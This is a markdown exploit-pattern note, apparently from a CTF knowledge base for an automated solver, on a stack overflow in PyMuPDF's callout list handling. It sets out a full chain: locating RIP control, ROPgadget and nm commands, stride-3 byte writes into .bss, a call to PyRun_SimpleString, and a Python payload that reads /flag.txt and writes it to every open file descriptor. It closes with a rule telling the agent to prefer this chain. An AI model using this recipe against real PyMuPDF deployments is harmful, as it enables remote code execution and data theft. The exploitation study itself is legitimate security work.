---
doc_kind: pattern
title: "PyMuPDF Callout Overflow: byte-wise BSS write + PyRun_SimpleString ROP"
category: pwn
slug: pymupdf-callout-overflow-pyrun-rop
created: 2026-10-10
status: active
tags:
  - pymupdf
  - callout
  - rop
  - non-pie
  - pyrun-simplestring
  - bss
  - stack-alignment
  - fd-exfil
chain_summary: "Overlong callout list overflows _extra.so stack (no canary) -> ROP in non-PIE python3.13 -> write python cmd byte-by-byte into .bss tail -> PyRun_SimpleString -> os.write flag to all fds"
---
# PyMuPDF Callout Overflow: byte-wise BSS write + PyRun_SimpleString ROP

## Chain Summary

- One-line chain: Overlong callout list overflows `_extra.so` stack (no canary) -> ROP in non-PIE `python3.13` -> write python cmd byte-by-byte into `.bss` tail -> `PyRun_SimpleString` -> `os.write` flag to all fds.
- Typical target shape: Python web app (Flask/gunicorn) that calls PyMuPDF
  `page.add_freetext_annot(..., callout=<user list>)`, packaged with a **non-PIE**
  CPython binary and a readable flag file.

## Preconditions

- PyMuPDF 1.28.2 (or similar) `_extra.so` with the fixed-buffer callout copy and
  **no stack canary**.
- The app passes an attacker-length list to `callout=`.
- The app's CPython is non-PIE (fixed gadget addresses) — verify with
  `file`/`readelf -h` (`Type: EXEC`).

## Cheap Probes

- Send a `DocMeta` with many points; a clean crash (exit 139 / connection drop)
  at the wrapper `ret` (RIP = your bytes) confirms RIP control.
- `ROPgadget --binary python3.13 | grep -E "pop rdi ; ret|pop rax ; ret|mov dword ptr \[rdi\], eax ; ret"`
- `nm python3.13 | grep ' T PyRun_SimpleString'`

## Telltale Evidence

- `movlps %xmm0,(%rsi,%rbx,8)` style indexed store into a fixed stack buffer.
- `movaps ... (%rsp)` SIGSEGV right after hijack => stack **misalignment**, not a
  bad gadget.

## Escalation Order

1. Reproduce locally with the exact wheel + app code; confirm RIP = point index
   `(ret_offset - buf_offset)/8` via gdb.
2. Build/obtain the non-PIE interpreter, `ROPgadget` + `nm`.
3. Pick a scratch buffer **after `.bss` `_end`** but inside the mapped RW page.
4. Store the Python command with stride-3 dword writes (respect the top-byte
   clamp from `JM_point_from_py`).
5. Align stack with one `ret`; call `PyRun_SimpleString(scratch)`.
6. Payload self-exfils (`os.write` to fds 0..63) then `os._exit(0)`.

## Common Mistakes

- Forgetting the float clamp that forces the 3rd/7th byte of each slot to be
  small => arbitrary ASCII in chain slots fails.
- Corrupting live `.bss` globals (use the page tail past `_end`).
- Missing the +8 stack alignment after a `ret`-based jump (movaps crash).
- Expecting to return to the web framework and render the response — you can't;
  exfil inside the payload.

## Payload Shapes

```text
[0]*9  # points 0-8 (indices 4-8 clobber saved regs)
+ ( POP_RDI, BSS+k, POP_RAX, b[k]|b[k+1]<<8|b[k+2]<<16, MOV_[RDI],EAX )*  # stride-3 write
+ ( RET )*ALIGN           # ALIGN=1 here
+ ( POP_RDI, BSS, PyRun_SimpleString )
# slot v -> x = v & 0xffffffff (must be < 2^31), y = 0
```

```python
# injected command
import os
d=open('/flag.txt','rb').read()
r=b'HTTP/1.0 200 OK\r\n\r\n'+d
for f in range(64):
 try:os.write(f,r)
 except:pass
os._exit(0)
```

## Related Writeups

- `../writeups/pwn/pdf-strikes-again-pymupdf-callout-rop.md`

## Skill Impact

- Related skill: `pwn-triage` (+ `web-triage` routing for a web-delivered native crash).
- Rule to add or update: when a web app hands attacker input to a native
  extension, pivot to `pwn-triage`; if the interpreter is non-PIE, prefer a
  `PyRun_SimpleString` ROP with byte-wise scratch writes and fd-blast exfil.
